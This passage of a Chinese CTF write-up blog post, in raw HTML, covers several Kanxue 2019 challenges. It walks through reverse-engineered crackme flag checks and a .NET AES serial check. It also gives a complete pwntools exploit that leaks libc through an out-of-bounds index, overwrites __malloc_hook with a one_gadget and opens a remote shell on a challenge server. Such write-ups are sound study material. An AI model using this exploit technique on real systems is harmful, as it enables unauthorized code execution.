class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE:<span class=\"number\">004734B</span>0                 push    ebp</span><br><span class=\"line\">CODE:<span class=\"number\">004734B</span>1                 mov     ebp, esp</span><br><span class=\"line\">CODE:<span class=\"number\">004734B</span>3                 leave</span><br><span class=\"line\">CODE:<span class=\"number\">004734B</span>4                 pusha</span><br><span class=\"line\">CODE:<span class=\"number\">004734B</span>5                 pushf</span><br><span class=\"line\">CODE:<span class=\"number\">004734B</span>6                 push    ebp</span><br><span class=\"line\">CODE:<span class=\"number\">004734B</span>7                 mov     ebp, esp</span><br><span class=\"line\">CODE:<span class=\"number\">004734B</span>9                 sub     esp, <span class=\"number\">10</span>h</span><br><span class=\"line\">CODE:<span class=\"number\">004734B</span>C                 lea     edx, [ebp+var_10]</span><br><span class=\"line\">CODE:<span class=\"number\">004734B</span>F                 push    edx</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>C0                 lea     edx, [ebp+var_C]</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>C3                 push    edx</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>C4                 lea     edx, [ebp+var_8]</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>C7                 push    edx</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>C8                 push    [ebp+arg_2C]</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>CB                 push    [ebp+arg_20]</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>CE                 push    [ebp+arg_28]</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>D1                 mov     edx, [ebp+arg_24]</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>D4                 mov     ecx, [ebp+<span class=\"number\">4</span>]</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>D7                 mov     [edx+<span class=\"number\">105</span>Ch], ecx</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>DD                 push    edx</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>DE                 call    sub_472EAC</span><br><span class=\"line\">CODE:<span class=\"number\">004734E3</span>                 leave</span><br><span class=\"line\">CODE:<span class=\"number\">004734E4</span>                 mov     eax, [esp+<span class=\"number\">30</span>h+var_30]</span><br><span class=\"line\">CODE:<span class=\"number\">004734E7</span>                 mov     [esp+<span class=\"number\">30</span>h+var_s0], eax</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>EB                 popf</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>EC                 popa</span><br><span class=\"line\">CODE:<span class=\"number\">004734</span>ED                 add     esp, <span class=\"number\">0</span>Ch</span><br><span class=\"line\">CODE:<span class=\"number\">004734F</span>0                 popf</span><br><span class=\"line\">CODE:<span class=\"number\">004734F</span>1                 jmp     [esp<span class=\"number\">-4</span>+var_40]</span><br><span class=\"line\">CODE:<span class=\"number\">004734F</span>1 sub_4734B0      endp</span><br></pre></td></tr></table></figure></p>\n<p>函数利用了jmp     [esp-4+var_40]该语句不停的跳转不同的指令进行对比，跟踪进去，发现这些指令就是用来比较flag的，单步跟踪和调试去满足它的比较条件，得出最后的flag为simpowera123。</p>\n<h3 id=\"第四题\"><a href=\"#第四题\" class=\"headerlink\" title=\"第四题\"></a>第四题</h3><p>这是一道pwn题，主要的逻辑如下：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 savedregs; <span class=\"comment\">// [rsp+10h] [rbp+0h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"This is a little game\\n\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"You can create a character and choose if he needs a partner.\\n\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    menu(<span class=\"string\">\"You can create a character and choose if he needs a partner.\\n\"</span>, argv);</span><br><span class=\"line\">    read_int(<span class=\"string\">\"You can create a character and choose if he needs a partner.\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)&amp;savedregs )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">1u</span>:</span><br><span class=\"line\">        singledog();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">2u</span>:</span><br><span class=\"line\">        luckydog();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">3u</span>:</span><br><span class=\"line\">        edit_singledog();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">4u</span>:</span><br><span class=\"line\">        edit_luckydog();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">5u</span>:</span><br><span class=\"line\">        save_singledog();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">6u</span>:</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在edit_singledog()，edit_luckydog()中，没有对数组的界限进行限制，所以可以对任意地址进行读写，所以泄露libc基址是最先考虑的问题，由于题目没有提供libc版本，所以我这里泄露public stderr@@GLIBC_2_2_5（_IO_2_1<em>stderr</em>）地址进行分析。<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">edit_singledog</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+4h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"which?\"</span>);</span><br><span class=\"line\">  v1 = read_int(<span class=\"string\">\"which?\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( two[v1] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Oh,singledog,changing your name can bring you good luck.\"</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, two[v1], <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"new name: %s\"</span>, two[v1]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"nothing here\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>泄露的stderr地址后3位为680，利用网站<a href=\"https://libc.blukat.me\" target=\"_blank\" rel=\"noopener\">https://libc.blukat.me</a> 进行分析，得出结果如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libc6_2.27-3ubuntu1_amd64</span><br><span class=\"line\">libc6_2.28-0ubuntu1_amd64</span><br><span class=\"line\">libc6_2.29-0ubuntu1_amd64</span><br></pre></td></tr></table></figure></p>\n<p>将这三个libc版本分别下载，同时利用one_gadget进行读取，得到服务器的flag。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> pdb</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_libc_base_addr</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"test\"</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"-4\"</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"fffffff\"</span>)</span><br><span class=\"line\">    p.recv(<span class=\"number\">18</span>)</span><br><span class=\"line\">    leak_addr = p.recv(<span class=\"number\">6</span>)</span><br><span class=\"line\">    _IO_2_1_stderr_addr = (u64(leak_addr.ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>)))- <span class=\"number\">0x83</span></span><br><span class=\"line\">    libc_base_addr = _IO_2_1_stderr_addr - elf.symbols[<span class=\"string\">'_IO_2_1_stderr_'</span>] </span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> libc_base_addr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_malloc_hook_gadget</span><span class=\"params\">(libc_base_addr)</span>:</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"xxxx\"</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"yyyy\"</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"80\"</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(p64(libc_base_addr+elf.symbols[<span class=\"string\">'__malloc_hook'</span>]))</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"0\"</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"xxxx\"</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(p64(libc_base_addr+<span class=\"number\">0x10a38c</span>))</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"/home/foyjog/Desktop/libc/libc6_2.27-3ubuntu1_amd64.so\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#elf = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./apwn\")</span></span><br><span class=\"line\">p =  remote(<span class=\"string\">'211.159.175.39'</span>,<span class=\"number\">8686</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pdb.set_trace()</span><br><span class=\"line\">libc_base_addr = get_libc_base_addr()</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(libc_base_addr)</span><br><span class=\"line\">set_malloc_hook_gadget(libc_base_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> p.recv()</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"第六题\"><a href=\"#第六题\" class=\"headerlink\" title=\"第六题\"></a>第六题</h3><p>这个题是我蒙混过关的，本来有两关，但是做了一关就被放行了= =<br>函数总体为：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sub_4014C0</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v0; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  sub_4044B0();</span><br><span class=\"line\">  v0 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">0x7F79745E</span>;</span><br><span class=\"line\">  v4 = <span class=\"number\">0x2B704C63</span>;</span><br><span class=\"line\">  v5 = <span class=\"number\">1630229319</span>;</span><br><span class=\"line\">  v6 = <span class=\"number\">1194152263</span>;</span><br><span class=\"line\">  v7 = <span class=\"number\">1198270550</span>;</span><br><span class=\"line\">  v8 = <span class=\"number\">695827786</span>;</span><br><span class=\"line\">  v9 = <span class=\"number\">1397178665</span>;</span><br><span class=\"line\">  v10 = <span class=\"number\">6644011</span>;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(Str, <span class=\"string\">\"Ansome_Is_Wrong\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v0 &lt; <span class=\"built_in\">strlen</span>((<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)&amp;v3) )</span><br><span class=\"line\">    *((_BYTE *)&amp;v3 + v0++) ^= <span class=\"number\">0x18</span>u;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Please Input Your Key_ Now!\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%s\"</span>, &amp;v11);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( sub_4012F0((<span class=\"keyword\">int</span>)&amp;v11) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_401460(&amp;v11);</span><br><span class=\"line\">    system(<span class=\"string\">\"pause\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(Str);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>跟进,得知第9位到第20为是X1Y0uN3tG00d，<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">sub_4012F0</span><span class=\"params\">(<span class=\"keyword\">int</span> a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( *((_BYTE *)&amp;v4 + v2) == *(_BYTE *)(v1 + a1) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ++v2;</span><br><span class=\"line\">    ++v1;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v2 &gt; <span class=\"number\">11</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      result = <span class=\"number\">1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( *(_BYTE *)(a1 + <span class=\"number\">20</span>) == <span class=\"number\">0x48</span> )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>继续往下跟<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">sub_4013B0</span><span class=\"params\">(<span class=\"keyword\">int</span> a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v3; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  sub_401380(a1);</span><br><span class=\"line\">  v1 = dword_40802C + <span class=\"number\">1000</span> * dword_408020 + <span class=\"number\">100</span> * dword_408024 + <span class=\"number\">10</span> * dword_408028;</span><br><span class=\"line\">  v2 = dword_408034 + <span class=\"number\">10</span> * dword_408030;</span><br><span class=\"line\">  v3 = dword_40803C + <span class=\"number\">10</span> * dword_408038;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">2</span> * (v1 + v2) != <span class=\"number\">4040</span> || <span class=\"number\">3</span> * v2 / <span class=\"number\">2</span> + <span class=\"number\">100</span> * v3 != <span class=\"number\">115</span> )</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_2;</span><br><span class=\"line\">  result = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 - <span class=\"number\">110</span> * v3 != <span class=\"number\">1900</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Key_Is_Wrong,Please_Input_Again!\"</span>);</span><br><span class=\"line\">LABEL_2:</span><br><span class=\"line\">    result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>得知前八位可以为20101001，这其实有很多个解满足，所以这也是这道题争论非常狂躁的原因，而我刚好捡个漏。= =<br>最后四位是一个栈溢出，只要溢出到0x401BF0即可，得出最后四位为HaCk，所以第一步的flag为20101001X1Y0uN3tG00dHaCk。</p>\n<h3 id=\"第十题\"><a href=\"#第十题\" class=\"headerlink\" title=\"第十题\"></a>第十题</h3><p>这是个.net。.net额，不靠谱。<br>利用dnSpy打开，并在函数入口点断点。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">using System;</span><br><span class=\"line\">using System.IO;</span><br><span class=\"line\">using System.Security.Cryptography;</span><br><span class=\"line\">using System.Text;</span><br><span class=\"line\"></span><br><span class=\"line\">// Token: 0x02000003 RID: 3</span><br><span class=\"line\">internal class a</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// Token: 0x06000004 RID: 4 RVA: 0x0000209B File Offset: 0x0000029B</span><br><span class=\"line\">\tprivate static void a(string[] A_0)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tConsole.WriteLine(&quot;Please Input Serial:&quot;);</span><br><span class=\"line\">\t\tif (global::a.a(Console.ReadLine(), &quot;Kanxue2019&quot;) == &quot;4RTlF9Ca2+oqExJwx68FiA==&quot;)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tConsole.WriteLine(&quot;Congratulations!  : )&quot;);</span><br><span class=\"line\">\t\t\tConsole.ReadLine();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// Token: 0x06000005 RID: 5 RVA: 0x000020D4 File Offset: 0x000002D4</span><br><span class=\"line\">\tpublic static string a(string A_0, string A_1)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tbyte[] bytes = Encoding.UTF8.GetBytes(&quot;Kanxue2019CTF-Q1&quot;);</span><br><span class=\"line\">\t\tbyte[] bytes2 = Encoding.UTF8.GetBytes(A_0);</span><br><span class=\"line\">\t\tbyte[] bytes3 = new PasswordDeriveBytes(A_1, null).GetBytes(32);</span><br><span class=\"line\">\t\tICryptoTransform transform = new RijndaelManaged</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tMode = CipherMode.CBC</span><br><span class=\"line\">\t\t&#125;.CreateEncryptor(bytes3, bytes);</span><br><span class=\"line\">\t\tMemoryStream memoryStream = new MemoryStream();</span><br><span class=\"line\">\t\tCryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);</span><br><span class=\"line\">\t\tcryptoStream.Write(bytes2, 0, bytes2.Length);</span><br><span class=\"line\">\t\tcryptoStream.FlushFinalBlock();</span><br><span class=\"line\">\t\tbyte[] inArray = memoryStream.ToArray();</span><br><span class=\"line\">\t\tmemoryStream.Close();</span><br><span class=\"line\">\t\tcryptoStream.Close();</span><br><span class=\"line\">\t\treturn Convert.ToBase64String(inArray);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// Token: 0x04000003 RID: 3</span><br><span class=\"line\">\tprivate const string a = &quot;Kanxue2019CTF-Q1&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// Token: 0x04000004 RID: 4</span><br><span class=\"line\">\tprivate const int b = 256;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>得出加密方式，反转一下即可。<br>如下代码解决：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 